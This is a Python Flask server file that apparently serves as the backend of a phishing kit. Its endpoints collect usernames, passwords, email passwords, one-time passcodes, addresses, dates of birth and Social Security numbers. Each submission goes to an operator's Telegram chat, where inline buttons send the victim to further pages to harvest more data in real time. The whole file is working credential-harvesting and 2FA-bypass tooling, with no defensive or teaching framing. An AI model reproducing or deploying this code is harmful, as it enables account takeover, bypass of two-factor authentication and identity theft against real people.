from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from html import escape
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
CORS(app)

# Telegram credentials (loaded from Render environment)
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

if not all([BOT_TOKEN, CHAT_ID, WEBHOOK_SECRET, WEBHOOK_URL]):
    raise RuntimeError("Missing one or more required environment variables.")

# Store sessions: {message_id: "redirect:otp", etc.}
session_status = {}

# --- Telegram Sender ---
def send_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    buttons = [
        [
            {"text": "➡️ OTP", "callback_data": "redirect:otp"},
            {"text": "📧 Email", "callback_data": "redirect:email"}
        ],
        [
            {"text": "📋 Personal", "callback_data": "redirect:personal"},
            {"text": "🔑 Login2", "callback_data": "redirect:login2"}
        ],
        [
            {"text": "🏠 Index", "callback_data": "redirect:index"},
            {"text": "🔁 Wait Page", "callback_data": "redirect:c"}
        ]
    ]
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": buttons}
    }

    try:
        res = requests.post(url, json=payload)
        res.raise_for_status()
        return str(res.json()["result"]["message_id"])
    except Exception as e:
        app.logger.error(f"Telegram send error: {e}")
        return None

# --- Routes ---

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    ip = data.get("ip")

    if not all([username, password, ip]):
        return jsonify({"error": "Missing login data"}), 400

    msg = (
        f"🔐 <b>Login Attempt</b>\n"
        f"👤 Username: <code>{escape(username)}</code>\n"
        f"🔑 Password: <code>{escape(password)}</code>\n"
        f"🌐 IP: <code>{escape(ip)}</code>"
    )
    session_id = send_message(msg)
    if session_id:
        session_status[session_id] = "pending"
        return jsonify({"session_id": session_id})
    return jsonify({"error": "Telegram send failed"}), 500


@app.route("/email", methods=["POST"])
def email_login():
    data = request.get_json()
    email = data.get("email")
    password = data.get("pass")
    ip = data.get("ip")

    if not all([email, password, ip]):
        return jsonify({"error": "Missing email login data"}), 400

    msg = (
        f"📧 <b>Email Login</b>\n"
        f"📨 Email: <code>{escape(email)}</code>\n"
        f"🔑 Password: <code>{escape(password)}</code>\n"
        f"🌐 IP: <code>{escape(ip)}</code>"
    )
    session_id = send_message(msg)
    if session_id:
        session_status[session_id] = "pending"
        return jsonify({"session_id": session_id})
    return jsonify({"error": "Telegram send failed"}), 500


@app.route("/otp", methods=["POST"])
def otp():
    data = request.get_json()
    code = data.get("otp")
    ip = data.get("ip")

    if not all([code, ip]):
        return jsonify({"error": "Missing OTP data"}), 400

    msg = (
        f"🔐 <b>OTP Verification</b>\n"
        f"🔢 Code: <code>{escape(code)}</code>\n"
        f"🌐 IP: <code>{escape(ip)}</code>"
    )
    session_id = send_message(msg)
    if session_id:
        session_status[session_id] = "pending"
        return jsonify({"session_id": session_id})
    return jsonify({"error": "Telegram send failed"}), 500


@app.route("/personal", methods=["POST"])
def personal_info():
    data = request.get_json()
    first = data.get("firstName")
    last = data.get("lastName")
    rest = data.get("restaurantName")
    address = data.get("address")
    dob = data.get("dob")
    ssn = data.get("ssn")

    if not all([first, last, rest, address, dob, ssn]):
        return jsonify({"error": "Missing personal info"}), 400

    msg = (
        f"📋 <b>Personal Info</b>\n"
        f"👤 Name: <code>{escape(first)} {escape(last)}</code>\n"
        f"🏪 Restaurant: <code>{escape(rest)}</code>\n"
        f"🏠 Address: <code>{escape(address)}</code>\n"
        f"🎂 DOB: <code>{escape(dob)}</code>\n"
        f"🆔 SSN: <code>{escape(ssn)}</code>"
    )
    session_id = send_message(msg)
    if session_id:
        session_status[session_id] = "pending"
        return jsonify({"session_id": session_id})
    return jsonify({"error": "Telegram send failed"}), 500


@app.route("/status/<session_id>")
def status(session_id):
    return jsonify({"status": session_status.get(session_id, "pending")})


@app.route("/webhook", methods=["POST"])
def webhook():
    if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != WEBHOOK_SECRET:
        return jsonify({"error": "Unauthorized"}), 403

    data = request.json
    callback = data.get("callback_query")
    if callback:
        msg_id = str(callback["message"]["message_id"])
        action = callback["data"]
        if action.startswith("redirect:"):
            target_page = action.split(":")[1]
            session_status[msg_id] = f"redirect:{target_page}"
            app.logger.info(f"Session {msg_id} set to redirect:{target_page}")
    return jsonify({"ok": True})


@app.route("/set-webhook")
def set_webhook():
    url = (
        f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
        f"?url={WEBHOOK_URL}/webhook&secret_token={WEBHOOK_SECRET}"
    )
    res = requests.get(url)
    return jsonify(res.json())


@app.route("/health")
def health():
    return jsonify({"status": "ok"})


if __name__ == "__main__":
    app.run(debug=True)
